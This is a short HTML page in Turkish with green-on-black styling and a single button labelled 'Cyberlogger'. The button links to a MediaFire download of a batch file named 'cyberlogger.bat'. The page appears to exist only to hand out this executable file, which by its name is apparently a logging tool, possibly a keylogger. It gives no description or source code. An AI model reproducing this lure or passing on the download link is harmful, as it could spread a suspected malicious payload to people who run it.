<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yeşil Çerçeve İçinde Buton</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #0d0d0d; /* Daha koyu bir arka plan */
            color: #00ff99; /* Yeşil metin */
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        .green-box {
            margin-top: 50px;
            border: 2px solid #00ff99; /* Yeşil çerçeve */
            padding: 20px;
            border-radius: 10px;
            background-color: #1a1a1a; /* Daha koyu bir arka plan */
            display: inline-block;
        }
        .test-button {
            display: inline-block;
            background-color: #00ff99;
            color: #1a1a1a;
            padding: 10px 20px;
            margin: 10px;
            text-decoration: none;
            border-radius: 5px;
            font-size: 18px;
            transition: transform 0.1s ease; /* Tıklama animasyonu */
        }
        .test-button:active {
            transform: scale(0.95); /* Tıklanınca küçülür */
        }
        .test-button:hover {
            background-color: #007755;
            color: #fff;
        }
    </style>
</head>
<body>

    <div class="green-box">
        <a href="https://www.mediafire.com/file/r2j1zu1ixevwucg/cyberlogger.bat/file?dkey=r39s55w6ea3&r=356" class="test-button">Cyberlogger</a>
    </div>

</body>
</html>
